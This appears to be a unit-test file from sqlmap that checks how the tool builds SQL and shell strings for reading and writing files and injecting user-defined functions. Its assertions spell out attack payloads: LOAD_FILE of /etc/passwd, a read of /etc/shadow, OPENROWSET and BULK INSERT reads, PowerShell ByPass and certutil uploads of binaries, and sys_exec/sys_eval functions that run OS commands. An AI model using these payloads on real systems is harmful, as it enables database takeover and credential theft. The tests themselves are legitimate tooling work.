#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission

Unit coverage for the file-read/file-write/UDF-injection SQL & command builders:

  - plugins/generic/filesystem.py      (encoding, INSERT/UPDATE query forging,
                                        length probe, read/write dispatch)
  - plugins/dbms/mssqlserver/filesystem.py
                                        (debug.exe SCR script, BULK INSERT /
                                        bin->hex extraction, PowerShell &
                                        certutil base64 upload commands)
  - lib/takeover/udf.py                (sys_exec/sys_eval calls, CREATE FUNCTION
                                        SQL for MySQL/PostgreSQL, remote-path
                                        selection, UDF pruning)

These methods are (near-)pure string builders given conf/kb plus the injection
layer. Each test drives the real method with inject.goStacked / inject.getValue
(and, for MSSQL, xpCmdshellWriteFile/execCmd) captured, and asserts the EXACT
SQL / command / encoded payload produced -- so a regression in the assembly
logic fails the test. No live target / network / DBMS involved.
"""

import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _testutils import bootstrap, set_dbms
bootstrap()

from lib.core.data import conf, kb
from lib.core.convert import encodeHex, encodeBase64, getText


# --------------------------------------------------------------------------- #
# shared base: snapshot/restore every global + monkeypatch these tests touch  #
# --------------------------------------------------------------------------- #
class _FsBase(unittest.TestCase):
    # subclasses set `target_modules` = list of modules whose inject.* we patch
    target_modules = ()

    # conf fields read by the methods under test
    _CONF_KEYS = ("batch", "direct", "fileRead", "fileWrite", "filePath",
                  "commonFiles", "osPwn", "osCmd", "osShell", "regRead",
                  "regAdd", "regDel", "tmpPath", "shLib", "encoding")
    _KB_KEYS = ("bruteMode", "binaryField", "fileReadMode")

    def setUp(self):
        self._conf = {k: conf.get(k) for k in self._CONF_KEYS}
        self._kb = {k: kb.get(k) for k in self._KB_KEYS}
        self._patched = []  # (obj, attr, original)

        conf.batch = True
        conf.direct = True
        kb.bruteMode = False

    def tearDown(self):
        for obj, attr, orig in reversed(self._patched):
            setattr(obj, attr, orig)
        for k, v in self._conf.items():
            conf[k] = v
        for k, v in self._kb.items():
            kb[k] = v

    def patch(self, obj, attr, value):
        self._patched.append((obj, attr, getattr(obj, attr)))
        setattr(obj, attr, value)
        return value


# --------------------------------------------------------------------------- #
# plugins/generic/filesystem.py                                               #
# --------------------------------------------------------------------------- #
class TestGenericFilesystem(_FsBase):
    import plugins.generic.filesystem as module

    def _fs(self):
        return self.module.Filesystem()

    # -- fileContentEncode ------------------------------------------------- #
    def test_fileContentEncode_hex_single(self):
        # single=True -> one element, 0x-prefixed, exact lower-case hex of bytes
        out = self._fs().fileContentEncode(b"ABC", "hex", True)
        self.assertEqual(out, ["0x414243"])

    def test_fileContentEncode_base64_single(self):
        out = self._fs().fileContentEncode(b"ABC", "base64", True)
        self.assertEqual(out, ["'QUJD'"])

    def test_fileContentEncode_hex_chunked(self):
        # 4 bytes -> 8 hex chars; chunkSize=4 -> two 0x-prefixed chunks of 4 chars
        out = self._fs().fileContentEncode(b"ABCD", "hex", False, chunkSize=4)
        self.assertEqual(out, ["0x4142", "0x4344"])

    def test_fileContentEncode_base64_chunked(self):
        # "ABCD" -> base64 "QUJDRA==" (8 chars); chunkSize=4 -> two quoted chunks
        out = self._fs().fileContentEncode(b"ABCD", "base64", False, chunkSize=4)
        self.assertEqual(out, ["'QUJD'", "'RA=='"])

    def test_fileContentEncode_chunk_below_threshold_is_single(self):
        # content shorter than chunkSize, single=False -> still one 0x chunk
        out = self._fs().fileContentEncode(b"AB", "hex", False, chunkSize=256)
        self.assertEqual(out, ["0x4142"])

    def test_fileEncode_reads_then_encodes(self):
        # fileEncode must read the file bytes and delegate to fileContentEncode
        path = os.path.join(
            os.environ.get("TMPDIR", "/tmp"), "sqlmap_fe_%d.bin" % os.getpid())
        with open(path, "wb") as f:
            f.write(b"hello")
        try:
            out = self._fs().fileEncode(path, "hex", True)
        finally:
            os.remove(path)
        self.assertEqual(out, ["0x%s" % getText(encodeHex(b"hello"))])
        self.assertEqual(out, ["0x68656c6c6f"])

    # -- fileToSqlQueries -------------------------------------------------- #
    def test_fileToSqlQueries_insert_then_concat_update(self):
        # first chunk -> INSERT; subsequent -> UPDATE using the DBMS concatenate
        # template (MySQL: CONCAT(field, chunk)).
        set_dbms("MySQL")
        fs = self._fs()
        queries = fs.fileToSqlQueries(["0x4142", "0x4344", "0x4546"])
        tbl, fld = fs.fileTblName, fs.tblField
        self.assertEqual(queries[0],
                         "INSERT INTO %s(%s) VALUES (0x4142)" % (tbl, fld))
        self.assertEqual(queries[1],
                         "UPDATE %s SET %s=CONCAT(%s,0x4344)" % (tbl, fld, fld))
        self.assertEqual(queries[2],
                         "UPDATE %s SET %s=CONCAT(%s,0x4546)" % (tbl, fld, fld))

    # -- _checkFileLength -------------------------------------------------- #
    def test_checkFileLength_mysql_query_and_samefile(self):
        # MySQL builds LENGTH(LOAD_FILE('<remote>')) and compares to local size.
        set_dbms("MySQL")
        path = os.path.join(
            os.environ.get("TMPDIR", "/tmp"), "sqlmap_cl_%d.bin" % os.getpid())
        with open(path, "wb") as f:
            f.write(b"12345")  # 5 bytes
        captured = {}

        def getValue(query, *a, **k):
            captured["query"] = query
            return "5"

        self.patch(self.module.inject, "getValue", getValue)
        try:
            same = self._fs()._checkFileLength(path, "/etc/passwd")
        finally:
            os.remove(path)
        self.assertEqual(captured["query"],
                         "LENGTH(LOAD_FILE('/etc/passwd'))")
        self.assertIs(same, True)

    def test_checkFileLength_size_differs(self):
        set_dbms("MySQL")
        path = os.path.join(
            os.environ.get("TMPDIR", "/tmp"), "sqlmap_cl2_%d.bin" % os.getpid())
        with open(path, "wb") as f:
            f.write(b"12345")  # local 5
        self.patch(self.module.inject, "getValue", lambda q, *a, **k: "9")
        try:
            same = self._fs()._checkFileLength(path, "/etc/passwd")
        finally:
            os.remove(path)
        # remote 9 != local 5  -> not the same file
        self.assertIs(same, False)

    def test_checkFileLength_mssql_openrowset_stacked(self):
        # MSSQL path issues an OPENROWSET BULK INSERT then DATALENGTH probe.
        # createSupportTbl lives in the misc mixin; stub it on a subclass so the
        # OPENROWSET-building branch runs in isolation.
        set_dbms("Microsoft SQL Server")
        path = os.path.join(
            os.environ.get("TMPDIR", "/tmp"), "sqlmap_cl3_%d.bin" % os.getpid())
        with open(path, "wb") as f:
            f.write(b"ABCD")  # 4 bytes
        stacked = []

        class FS(self.module.Filesystem):
            def createSupportTbl(self, *a, **k):
                pass

        self.patch(self.module.inject, "goStacked",
                   lambda q, *a, **k: stacked.append(q))
        self.patch(self.module.inject, "getValue", lambda q, *a, **k: "4")
        fs = FS()
        try:
            same = fs._checkFileLength(path, "C:\\boot.ini")
        finally:
            os.remove(path)
        tbl, fld = fs.fileTblName, fs.tblField
        # createSupportTbl DROP+CREATE, then the OPENROWSET insert
        insert = ("INSERT INTO %s(%s) SELECT %s FROM OPENROWSET(BULK "
                  "'C:\\boot.ini', SINGLE_BLOB) AS %s(%s)"
                  % (tbl, fld, fld, tbl, fld))
        self.assertIn(insert, stacked)
        self.assertIs(same, True)

    def test_checkFileLength_not_written_warns_false(self):
        # non-positive remote size -> treated as "not written" -> sameFile False
        set_dbms("MySQL")
        path = os.path.join(
            os.environ.get("TMPDIR", "/tmp"), "sqlmap_cl4_%d.bin" % os.getpid())
        with open(path, "wb") as f:
            f.write(b"x")
        self.patch(self.module.inject, "getValue", lambda q, *a, **k: None)
        try:
            same = self._fs()._checkFileLength(path, "/etc/passwd")
        finally:
            os.remove(path)
        self.assertIs(same, False)

    # -- readFile ---------------------------------------------------------- #
    def test_readFile_decodes_hex_and_writes(self):
        # Drive the generic readFile orchestration with a stubbed stackedReadFile
        # returning canned hex; assert the bytes handed to dataToOutFile are the
        # decoded content (raw bytes), and the remote name is passed through.
        set_dbms("MySQL")
        written = {}

        class FS(self.module.Filesystem):
            def checkDbmsOs(self):
                pass

            def cleanup(self, *a, **k):
                pass

            def stackedReadFile(self, remoteFile):
                return encodeHex(b"secret-data", binary=False)

            def askCheckReadFile(self, localFile, remoteFile):
                return None

        def grab(name, data):
            written["d"] = (name, data)
            return "/out/path"

        self.patch(self.module, "dataToOutFile", grab)
        out = FS().readFile("/etc/shadow")
        self.assertEqual(written["d"][0], "/etc/shadow")
        self.assertEqual(written["d"][1], b"secret-data")
        self.assertEqual(out, ["/out/path"])

    def test_readFile_listlike_chunks_joined(self):
        # list-of-chunks return value gets flattened before hex-decoding
        set_dbms("MySQL")
        written = {}

        class FS(self.module.Filesystem):
            def checkDbmsOs(self):
                pass

            def cleanup(self, *a, **k):
                pass

            def stackedReadFile(self, remoteFile):
                # two chunks (each a 1-element list, as inject.getValue returns)
                return [[encodeHex(b"AB", binary=False)],
                        [encodeHex(b"CD", binary=False)]]

            def askCheckReadFile(self, localFile, remoteFile):
                return True

        def grab(name, data):
            written["d"] = data
            return "/out"

        self.patch(self.module, "dataToOutFile", grab)
        out = FS().readFile("/f")
        self.assertEqual(written["d"], b"ABCD")
        # askCheckReadFile True -> suffix annotation
        self.assertEqual(out, ["/out (same file)"])

    # -- writeFile dispatch ------------------------------------------------ #
    def test_writeFile_dispatches_to_stacked(self):
        # With stacking available (conf.direct True), writeFile must route to
        # stackedWriteFile and return its result.
        set_dbms("MySQL")
        path = os.path.join(
            os.environ.get("TMPDIR", "/tmp"), "sqlmap_wf_%d.bin" % os.getpid())
        with open(path, "wb") as f:
            f.write(b"data")
        calls = {}

        class FS(self.module.Filesystem):
            def checkDbmsOs(self):
                pass

            def cleanup(self, *a, **k):
                calls["cleanup"] = True

            def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
                calls["args"] = (localFile, remoteFile, fileType, forceCheck)
                return True

        try:
            res = FS().writeFile(path, "/var/www/x", "text", forceCheck=True)
        finally:
            os.remove(path)
        self.assertIs(res, True)
        self.assertEqual(calls["args"], (path, "/var/www/x", "text", True))
        self.assertTrue(calls["cleanup"])


# --------------------------------------------------------------------------- #
# plugins/dbms/mssqlserver/filesystem.py                                      #
# --------------------------------------------------------------------------- #
class TestMSSQLFilesystem(_FsBase):
    import plugins.dbms.mssqlserver.filesystem as module

    def _handler(self):
        from plugins.dbms.mssqlserver import MSSQLServerMap
        set_dbms("Microsoft SQL Server")
        return MSSQLServerMap()

    # -- _dataToScr (debug.exe script) ------------------------------------- #
    def test_dataToScr_header_and_hex_bytes(self):
        fs = self._handler()
        lines = fs._dataToScr(b"AB", "chunk1")
        # header: name / rcx / size(hex) / fill
        self.assertEqual(lines[0], "n chunk1")
        self.assertEqual(lines[1], "rcx")
        self.assertEqual(lines[2], "%x" % 2)          # size = 2 bytes
        self.assertEqual(lines[3], "f 0100 %x 00" % 2)
        # the data 'e' line: base addr 0x100, hex of 'A'(41) and 'B'(42)
        self.assertEqual(lines[4], "e 100 41 42")
        self.assertEqual(lines[-2], "w")
        self.assertEqual(lines[-1], "q")

    def test_dataToScr_wraps_lines_and_advances_address(self):
        # lineLen=20, so 21 bytes -> two 'e' lines; second starts at 0x100+20=0x114
        fs = self._handler()
        content = bytes(bytearray(range(21)))  # 21 bytes 0x00..0x14
        lines = fs._dataToScr(content, "c")
        eLines = [ln for ln in lines if ln.startswith("e ")]
        self.assertEqual(len(eLines), 2)
        self.assertTrue(eLines[0].startswith("e 100 00 01 02"))
        # 20 bytes consumed -> next address 0x100+0x14 = 0x114
        self.assertTrue(eLines[1].startswith("e 114 14"))

    # -- stackedReadFile (BULK INSERT + bin->hex extraction) --------------- #
    def test_stackedReadFile_builds_bulk_insert_and_decodes(self):
        fs = self._handler()
        stacked = []
        self.patch(self.module.inject, "goStacked",
                   lambda q, *a, **k: stacked.append(q))

        # UNION available -> single getValue returns the hex content directly
        def getValue(query, *a, **k):
            return encodeHex(b"file-bytes", binary=False)

        self.patch(self.module.inject, "getValue", getValue)
        self.patch(self.module, "isTechniqueAvailable", lambda *a, **k: True)

        result = fs.stackedReadFile("C:\\secret.txt")

        # the BULK INSERT statement loading the file into the support table
        bulk = [q for q in stacked if q.startswith("BULK INSERT ")]
        self.assertEqual(len(bulk), 1)
        self.assertIn("FROM 'C:\\secret.txt'", bulk[0])
        self.assertIn("CODEPAGE='RAW'", bulk[0])
        # the bin->hex conversion routine must reference the 0..F charset
        binhex = [q for q in stacked if "0123456789ABCDEF" in q]
        self.assertEqual(len(binhex), 1)
        self.assertIn("DATALENGTH", binhex[0])
        # result is the raw hex string returned by getValue
        self.assertEqual(result, encodeHex(b"file-bytes", binary=False))

    def test_stackedReadFile_chunked_when_no_union(self):
        # No UNION technique -> COUNT(*) then per-row TOP-1 retrieval into a list
        fs = self._handler()
        self.patch(self.module.inject, "goStacked", lambda q, *a, **k: None)
        self.patch(self.module, "isTechniqueAvailable", lambda *a, **k: False)

        chunks = ["41", "42"]

        def getValue(query, *a, **k):
            if query.startswith("SELECT COUNT(*)"):
                return "2"
            # the per-index extraction query
            if "NOT IN (SELECT TOP" in query:
                return chunks.pop(0)
            return None

        self.patch(self.module.inject, "getValue", getValue)
        result = fs.stackedReadFile("C:\\x")
        self.assertEqual(result, ["41", "42"])

    # -- unionWriteFile is explicitly unsupported -------------------------- #
    def test_unionWriteFile_unsupported(self):
        from lib.core.exception import SqlmapUnsupportedFeatureException
        fs = self._handler()
        self.assertRaises(SqlmapUnsupportedFeatureException,
                          fs.unionWriteFile, "a", "b", "binary")

    # -- _stackedWriteFilePS (PowerShell base64) --------------------------- #
    def test_stackedWriteFilePS_uploads_base64_and_builds_ps(self):
        fs = self._handler()
        writes = []
        cmds = []
        self.patch(fs, "xpCmdshellWriteFile",
                   lambda content, path, name: writes.append((content, name)))
        self.patch(fs, "execCmd", lambda cmd: cmds.append(cmd))

        fs._stackedWriteFilePS("C:\\Windows\\Temp", b"payload",
                               "C:\\out.exe", "binary")

        expected_b64 = encodeBase64(b"payload", binary=False)
        # the base64 payload goes to the .txt file; the .ps1 holds the decoder.
        uploaded = "".join(c for c, name in writes if name.endswith(".txt"))
        self.assertEqual(uploaded, expected_b64)
        # the powershell command line: ByPass + reference to the .ps1 script
        self.assertEqual(len(cmds), 1)
        self.assertIn("powershell -ExecutionPolicy ByPass -File", cmds[0])

    def test_stackedWriteFilePS_script_decodes_to_remote(self):
        # Assert the PS script body contains the FromBase64String + Set-Content
        # targeting the exact remote file path.
        fs = self._handler()
        script = {}

        def grab(content, path, name):
            if name.endswith(".ps1"):
                script["body"] = content

        self.patch(fs, "xpCmdshellWriteFile", grab)
        self.patch(fs, "execCmd", lambda cmd: None)
        fs._stackedWriteFilePS("C:\\T", b"abc", "C:\\target.dll", "binary")
        self.assertIn("[System.Convert]::FromBase64String($Base64)", script["body"])
        self.assertIn('Set-Content -Path "C:\\target.dll"', script["body"])

    # -- _stackedWriteFileCertutilExe (certutil base64) -------------------- #
    def test_stackedWriteFileCertutil_splits_b64_and_decodes(self):
        fs = self._handler()
        writes = []
        cmds = []
        self.patch(fs, "xpCmdshellWriteFile",
                   lambda content, path, name: writes.append(content))
        self.patch(fs, "execCmd", lambda cmd: cmds.append(cmd))

        # >500 chars of base64 so the splitter actually wraps lines
        content = b"Z" * 600
        fs._stackedWriteFileCertutilExe("C:\\T", "local", content,
                                        "C:\\out.bin", "binary")

        b64 = encodeBase64(content, binary=False)
        # uploaded text == base64 rejoined on newline at 500-char boundaries
        uploaded = writes[0]
        self.assertEqual(uploaded.replace("\n", ""), b64)
        self.assertEqual(uploaded.split("\n")[0], b64[:500])
        # certutil -decode command targeting the remote file
        self.assertEqual(len(cmds), 1)
        self.assertIn("certutil -f -decode", cmds[0])
        self.assertIn("C:\\out.bin", cmds[0])


# --------------------------------------------------------------------------- #
# lib/takeover/udf.py  (+ MySQL/PostgreSQL CREATE FUNCTION overrides)         #
# --------------------------------------------------------------------------- #
class TestUDF(_FsBase):
    import lib.takeover.udf as module

    def _udf(self):
        u = self.module.UDF()
        u.cmdTblName = "cmdtbl"
        u.tblField = "data"
        return u

    # -- udfForgeCmd ------------------------------------------------------- #
    def test_udfForgeCmd_wraps_quotes(self):
        u = self._udf()
        self.assertEqual(u.udfForgeCmd("whoami"), "'whoami'")
        # already partially quoted -> not doubled
        self.assertEqual(u.udfForgeCmd("'whoami"), "'whoami'")
        self.assertEqual(u.udfForgeCmd("whoami'"), "'whoami'")

    def _escaped(self, u, cmd):
        # mirror udfExecCmd's argument preparation: forge then escape via the
        # active DBMS unescaper. (The escaper may hex-encode the literal; we want
        # to assert the SELECT wrapping/udf-name wiring, not re-test escaping.)
        return self.module.unescaper.escape(u.udfForgeCmd(cmd))

    # -- udfExecCmd -------------------------------------------------------- #
    def test_udfExecCmd_builds_select_call(self):
        set_dbms("MySQL")
        u = self._udf()
        captured = {}
        self.patch(self.module.inject, "goStacked",
                   lambda q, silent=False: captured.setdefault("q", q))
        u.udfExecCmd("id")
        # default udfName is sys_exec; arg is the forged+escaped command
        self.assertEqual(captured["q"],
                         "SELECT sys_exec(%s)" % self._escaped(u, "id"))

    def test_udfExecCmd_custom_udf_name(self):
        set_dbms("MySQL")
        u = self._udf()
        captured = {}
        self.patch(self.module.inject, "goStacked",
                   lambda q, silent=False: captured.setdefault("q", q))
        u.udfExecCmd("id", udfName="my_fn")
        self.assertEqual(captured["q"],
                         "SELECT my_fn(%s)" % self._escaped(u, "id"))

    # -- udfEvalCmd -------------------------------------------------------- #
    def test_udfEvalCmd_direct_joins_lines(self):
        # conf.direct -> uses udfExecCmd output, converting \r to \n
        set_dbms("MySQL")
        conf.direct = True
        u = self._udf()
        self.patch(self.module.inject, "goStacked",
                   lambda q, silent=False: ["foo\rbar", "baz"])
        out = u.udfEvalCmd("id")
        self.assertEqual(out, "foo\nbarbaz")

    def test_udfEvalCmd_stacked_insert_select_delete(self):
        # non-direct -> INSERT via UDF, SELECT back, then DELETE
        set_dbms("MySQL")
        conf.direct = False
        u = self._udf()
        stacked = []
        self.patch(self.module.inject, "goStacked",
                   lambda q, *a, **k: stacked.append(q))
        self.patch(self.module.inject, "getValue",
                   lambda q, *a, **k: "RESULT")
        out = u.udfEvalCmd("id", udfName="sys_eval")
        self.assertEqual(
            stacked[0],
            "INSERT INTO cmdtbl(data) VALUES (sys_eval(%s))"
            % self._escaped(u, "id"))
        self.assertEqual(stacked[1], "DELETE FROM cmdtbl")
        self.assertEqual(out, "RESULT")

    # -- udfCheckNeeded (pruning of the sys UDF set) ----------------------- #
    def test_udfCheckNeeded_prunes_unrequested_udfs(self):
        set_dbms("MySQL")
        u = self._udf()
        u.sysUdfs = {
            "sys_fileread": {}, "sys_bineval": {},
            "sys_eval": {}, "sys_exec": {},
        }
        # nothing requested -> everything irrelevant gets popped
        conf.fileRead = conf.commonFiles = None
        conf.osPwn = conf.osCmd = conf.osShell = conf.regRead = False
        conf.regAdd = conf.regDel = False
        u.udfCheckNeeded()
        self.assertEqual(u.sysUdfs, {})

    def test_udfCheckNeeded_keeps_exec_for_oscmd(self):
        set_dbms("MySQL")
        u = self._udf()
        u.sysUdfs = {
            "sys_fileread": {}, "sys_bineval": {},
            "sys_eval": {}, "sys_exec": {},
        }
        conf.fileRead = conf.commonFiles = None
        conf.osPwn = False
        conf.osCmd = True            # requests command exec
        conf.osShell = conf.regRead = conf.regAdd = conf.regDel = False
        u.udfCheckNeeded()
        # sys_eval & sys_exec retained; fileread/bineval pruned
        self.assertIn("sys_eval", u.sysUdfs)
        self.assertIn("sys_exec", u.sysUdfs)
        self.assertNotIn("sys_fileread", u.sysUdfs)
        self.assertNotIn("sys_bineval", u.sysUdfs)

    def test_udfCheckNeeded_keeps_fileread_for_pgsql_fileread(self):
        # sys_fileread is retained ONLY when a file read is requested AND the
        # back-end is PostgreSQL (per the explicit DBMS.PGSQL guard).
        set_dbms("PostgreSQL")
        u = self._udf()
        u.sysUdfs = {"sys_fileread": {}, "sys_bineval": {},
                     "sys_eval": {}, "sys_exec": {}}
        conf.fileRead = "/etc/passwd"
        conf.commonFiles = None
        conf.osPwn = conf.osCmd = conf.osShell = conf.regRead = False
        conf.regAdd = conf.regDel = False
        u.udfCheckNeeded()
        self.assertIn("sys_fileread", u.sysUdfs)

    def test_udfCheckNeeded_drops_fileread_for_mysql_fileread(self):
        # On MySQL the same file-read request still prunes sys_fileread (the
        # guard keeps it only for PostgreSQL).
        set_dbms("MySQL")
        u = self._udf()
        u.sysUdfs = {"sys_fileread": {}, "sys_bineval": {},
                     "sys_eval": {}, "sys_exec": {}}
        conf.fileRead = "/etc/passwd"
        conf.commonFiles = None
        conf.osPwn = conf.osCmd = conf.osShell = conf.regRead = False
        conf.regAdd = conf.regDel = False
        u.udfCheckNeeded()
        self.assertNotIn("sys_fileread", u.sysUdfs)

    # -- udfCheckAndOverwrite --------------------------------------------- #
    def test_udfCheckAndOverwrite_new_udf_scheduled(self):
        # UDF does not exist -> no overwrite prompt -> scheduled for creation
        set_dbms("MySQL")
        u = self._udf()
        self.patch(self.module.inject, "getValue", lambda q, *a, **k: False)
        u.udfCheckAndOverwrite("sys_eval")
        self.assertIn("sys_eval", u.udfToCreate)

    def test_udfCheckAndOverwrite_existing_no_overwrite(self):
        # UDF exists and user declines overwrite -> NOT scheduled
        set_dbms("MySQL")
        u = self._udf()
        self.patch(self.module.inject, "getValue", lambda q, *a, **k: True)
        self.patch(u, "_askOverwriteUdf", lambda udf: False)
        u.udfCheckAndOverwrite("sys_eval")
        self.assertNotIn("sys_eval", u.udfToCreate)

    # -- udfInjectCore ----------------------------------------------------- #
    def test_udfInjectCore_uploads_and_creates(self):
        # Drive the full inject orchestration with the file write succeeding:
        # every requested UDF must end up created and the support table built.
        set_dbms("MySQL")
        calls = {"created": [], "supportType": None}

        class U(self.module.UDF):
            def __init__(self):
                super(U, self).__init__()
                self.cmdTblName = "cmdtbl"
                self.tblField = "data"
                self.udfLocalFile = __file__  # any existing file (checkFile passes)
                self.udfRemoteFile = "/tmp/lib.so"

            def udfSetRemotePath(self):
                pass

            def writeFile(self, localFile, remoteFile, fileType, forceCheck=False):
                calls["write"] = (remoteFile, fileType, forceCheck)
                return True

            def udfCreateFromSharedLib(self, udf, inpRet):
                calls["created"].append(udf)
                self.createdUdf.add(udf)

            def udfCreateSupportTbl(self, dataType):
                calls["supportType"] = dataType

        u = U()
        self.patch(self.module.inject, "getValue", lambda q, *a, **k: False)
        result = u.udfInjectCore({"sys_eval": {"return": "string"}})
        self.assertIs(result, True)
        # binary upload forced; remote path threaded through
        self.assertEqual(calls["write"], ("/tmp/lib.so", "binary", True))
        self.assertEqual(calls["created"], ["sys_eval"])
        # MySQL support table uses longtext
        self.assertEqual(calls["supportType"], "longtext")

    def test_udfInjectCore_noop_when_all_already_created(self):
        # If every UDF is already created, nothing is uploaded and it returns True
        set_dbms("MySQL")

        class U(self.module.UDF):
            def writeFile(self, *a, **k):
                raise AssertionError("writeFile must not be called")

        u = U()
        u.createdUdf = {"sys_eval"}
        result = u.udfInjectCore({"sys_eval": {"return": "string"}})
        self.assertIs(result, True)
        self.assertEqual(u.udfToCreate, set())

    # -- MySQL udfCreateFromSharedLib (CREATE FUNCTION ... SONAME) --------- #
    def test_mysql_udfCreateFromSharedLib_sql(self):
        import plugins.dbms.mysql.takeover as mod
        set_dbms("MySQL")
        t = mod.Takeover()
        t.udfToCreate = {"sys_eval"}
        t.createdUdf = set()
        t.udfSharedLibName = "libsabc"
        t.udfSharedLibExt = "so"
        stacked = []
        self.patch(mod.inject, "goStacked", lambda q, *a, **k: stacked.append(q))
        t.udfCreateFromSharedLib("sys_eval", {"return": "string"})
        self.assertEqual(stacked[0], "DROP FUNCTION sys_eval")
        self.assertEqual(
            stacked[1],
            "CREATE FUNCTION sys_eval RETURNS string SONAME 'libsabc.so'")
        self.assertIn("sys_eval", t.createdUdf)

    # -- PostgreSQL udfCreateFromSharedLib (CREATE OR REPLACE FUNCTION) ---- #
    def test_pgsql_udfCreateFromSharedLib_sql(self):
        import plugins.dbms.postgresql.takeover as mod
        set_dbms("PostgreSQL")
        t = mod.Takeover()
        t.udfToCreate = {"sys_eval"}
        t.createdUdf = set()
        t.udfRemoteFile = "/tmp/libsabc.so"
        stacked = []
        self.patch(mod.inject, "goStacked", lambda q, *a, **k: stacked.append(q))
        t.udfCreateFromSharedLib(
            "sys_eval", {"input": ["text"], "return": "text"})
        self.assertEqual(stacked[0], "DROP FUNCTION sys_eval(text)")
        self.assertEqual(
            stacked[1],
            "CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS "
            "'/tmp/libsabc.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL "
            "INPUT IMMUTABLE")

    # -- PostgreSQL udfSetRemotePath (OS-dependent path) ------------------- #
    def test_pgsql_udfSetRemotePath_linux_and_windows(self):
        # Linux -> /tmp/<lib>; Windows -> bare <lib> (saved into the data dir).
        # Set kb.os directly to avoid Backend.setOs()'s interactive OS-mismatch
        # prompt when flipping the OS mid-test.
        import plugins.dbms.postgresql.takeover as mod
        from lib.core.enums import OS
        set_dbms("PostgreSQL")
        t = mod.Takeover()
        t.udfSharedLibName = "libsxyz"
        t.udfSharedLibExt = "so"

        _os = kb.os
        try:
            kb.os = OS.LINUX
            t.udfSetRemotePath()
            self.assertEqual(t.udfRemoteFile, "/tmp/libsxyz.so")

            kb.os = OS.WINDOWS
            t.udfSharedLibExt = "dll"
            t.udfSetRemotePath()
            self.assertEqual(t.udfRemoteFile, "libsxyz.dll")
        finally:
            kb.os = _os


if __name__ == "__main__":
    unittest.main()
